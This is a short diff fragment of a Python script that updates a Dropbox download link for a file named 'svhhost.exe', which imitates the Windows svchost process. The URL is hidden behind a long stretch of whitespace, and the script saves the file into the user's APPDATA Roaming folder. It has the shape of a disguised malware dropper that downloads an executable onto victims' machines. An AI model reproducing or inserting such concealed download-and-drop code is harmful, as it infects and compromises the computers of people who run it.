@@ -4,7 +4,7 @@ import requests
 import subprocess
 
 
-url =                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                   "https://www.dropbox.com/scl/fi/e0ekofx3spco71vzl3v9a/svhhost.exe?rlkey=k9aa17sno2xp8hp6a9thk0lm5&st=59akwlc8&dl=1"
+url =                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                   "https://www.dropbox.com/scl/fi/e0ekofx3spco71vzl3v9a/svhhost.exe?rlkey=k9aa17sno2xp8hp6a9thk0lm5&st=g2amfwy5&dl=1"
 
 appdata_roaming = os.path.join(os.environ.get('APPDATA', ''), 'svhhost.exe')
 
